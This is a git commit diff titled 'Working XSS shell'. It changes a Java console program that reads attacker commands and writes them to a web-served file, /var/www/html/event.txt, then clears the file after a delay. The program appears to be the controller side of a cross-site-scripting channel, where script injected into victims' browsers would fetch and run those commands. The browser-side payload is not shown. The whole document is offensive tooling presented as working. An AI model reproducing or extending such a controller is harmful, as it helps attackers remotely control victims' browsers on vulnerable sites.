ae749145a7813923987f86fbd43f1493b67c099a
Gydo194 <gydo.kosten@gmail.com>
2016-12-07 18:46:28 +0100

    Working XSS shell

--- xss.java
+++ xss.java
@@ -4,14 +4,14 @@ import java.nio.file.Files;
 import java.nio.file.Paths;
 
 public class xss {
-	public static void main(String[] args) throws IOException {
+	public static void main(String[] args) throws IOException, InterruptedException {
 		Console std = System.console();
 		String empty = "";
 		while(true) {
 		String command = std.readLine("XSS > ");
 		Files.write(Paths.get("/var/www/html/event.txt"), command.getBytes());
 		System.out.println("Executing...");
-		//Thread.sleep(7500);
+		Thread.sleep(7500);
 		System.out.println("done");
 		Files.write(Paths.get("/var/www/html/event.txt"), empty.getBytes());
 		}
